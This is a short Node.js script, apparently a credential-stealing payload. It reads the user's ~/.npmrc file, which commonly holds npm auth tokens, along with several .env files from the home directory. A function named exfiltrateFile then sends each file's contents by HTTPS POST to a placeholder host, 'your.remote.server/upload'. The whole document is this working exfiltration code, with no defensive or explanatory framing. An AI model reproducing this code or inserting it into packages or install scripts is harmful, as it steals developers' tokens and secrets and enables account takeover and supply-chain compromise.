const fs = require('fs');
const path = require('path');
const https = require('https');

const exfiltrateFile = (filePath) => {
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error(`Error reading file ${filePath}:`, err);
      return;
    }

    const postData = JSON.stringify({ file: filePath, content: data });

    const options = {
      hostname: 'your.remote.server',
      port: 443,
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = https.request(options, (res) => {
      console.log(`Status Code: ${res.statusCode}`);
    });

    req.on('error', (e) => {
      console.error(`Problem with request: ${e.message}`);
    });

    req.write(postData);
    req.end();
  });
};

const npmrcPath = path.join(process.env.HOME, '.npmrc');
const envFiles = ['.env', '.env.local', '.env.development', '.env.production'];

exfiltrateFile(npmrcPath);
envFiles.forEach(file => exfiltrateFile(path.join(process.env.HOME, file)));
